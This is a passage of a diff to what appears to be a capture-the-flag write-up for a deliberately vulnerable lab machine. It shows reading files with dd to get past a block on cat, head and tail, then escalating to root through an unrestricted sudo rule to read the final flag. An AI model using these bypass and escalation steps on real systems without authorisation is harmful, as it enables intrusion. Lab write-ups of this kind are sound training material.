@@ -66,3 +66,32 @@ Next step was browsing about, and the first place I looked was the home dirs. Th
 `cat` was blocked as already discussed. So was `head` and `tail`. However `dd` was not:
 
 `dd count=200 bs=1 if=/home/rick/second\ ingredients` revealed `1 jerry tear`
+
+## sudo and finish
+
+I tried doing a search for suid bits, but it didn't seem to work. On a whim I ran `sudo -l` and to my surprise found: 
+
+```
+Matching Defaults entries for www-data on ip-10-10-17-154.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-17-154.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+```
+
+Easy. `sudo ls -lA /root` revealed:
+
+```
+total 20
+-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwx------ 2 root root 4096 Feb 10  2019 .ssh
+-rw-r--r-- 1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x 3 root root 4096 Feb 10  2019 snap
+```
+
+And then `sudo dd count=200 bs=1 if=/root/3rd.txt` revealed `3rd ingredients: fleeb juice`
+
+## Summary
+
+I wish I had guessed on my own the password from robots.txt, but aside from that this was all trivial.
